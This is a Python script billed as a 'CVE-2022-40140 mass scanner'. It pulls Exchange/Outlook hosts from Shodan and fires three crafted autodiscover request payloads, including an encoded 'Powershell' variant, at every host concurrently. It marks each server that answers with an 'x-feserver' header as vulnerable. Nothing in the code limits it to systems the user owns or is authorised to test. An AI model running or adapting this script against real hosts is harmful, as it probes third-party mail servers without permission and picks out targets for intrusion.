
'''
 /$$                     /$$
|__/                    | $$
 /$$  /$$$$$$   /$$$$$$$| $$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$
| $$ /$$__  $$ /$$_____/| $$__  $$ /$$__  $$| $$  | $$| $$__  $$ /$$__  $$
| $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$
| $$| $$  | $$ \____  $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$
| $$| $$$$$$$/ /$$$$$$$/| $$$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$/
|__/| $$____/ |_______/ |_______/ |__/       \______/ |__/  |__/ \______/
    | $$
    | $$
    |__/

CVE-2022-40140 MASS SCANNER
'''


import grequests
import requests
from shodan import Shodan
import uuid
import logging
import urllib3
import urllib
import time
import argparse
from urllib.parse import urlsplit, urlunsplit




api = Shodan('YOUR SHODAN API KEY')

payloads = [
  "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell",
  "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell",
    "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"
]

dork ="http.title:\"Outlook\""


repeated= []


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do_something(r):
    if r != None and r and 'x-feserver' in r.headers:
        print(r.url,' VULNERABLE', r.status_code)


def base_url(url, with_path=False):
    parsed = urllib.parse.urlparse(url)
    path   = '/'.join(parsed.path.split('/')[:-1]) if with_path else ''
    parsed = parsed._replace(path=path)
    parsed = parsed._replace(params='')
    parsed = parsed._replace(query='')
    parsed = parsed._replace(fragment='')
    return parsed.geturl()

def main():

    start = 0
    end = 100
    user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'}
    while start < end:
        results = api.search(dork,page=start)
        urls = []
        print('Pagina ', start)
        for banner in results["matches"]:
            if 'hostnames' in banner:
                for hostname in banner["hostnames"]:
                    if hostname in repeated:
                        continue
                    hostname = (base_url('http://'+hostname)).split("http://")[1]
                    repeated.append(hostname)
                    urls.append('http://'+hostname)
                    urls.append('https://'+hostname)
                    urls.append('http://'+hostname+':'+str(banner["port"]))
                    urls.append('https://'+hostname+':'+str(banner["port"]))

        for payload in payloads:
            results = grequests.map((grequests.get(u+payload, headers=user_agent, allow_redirects=False, timeout=10, verify = 'https' in u) for u in urls))
            for result in results:
                do_something(result)
        

        start += 1

if __name__ == '__main__':
    main()
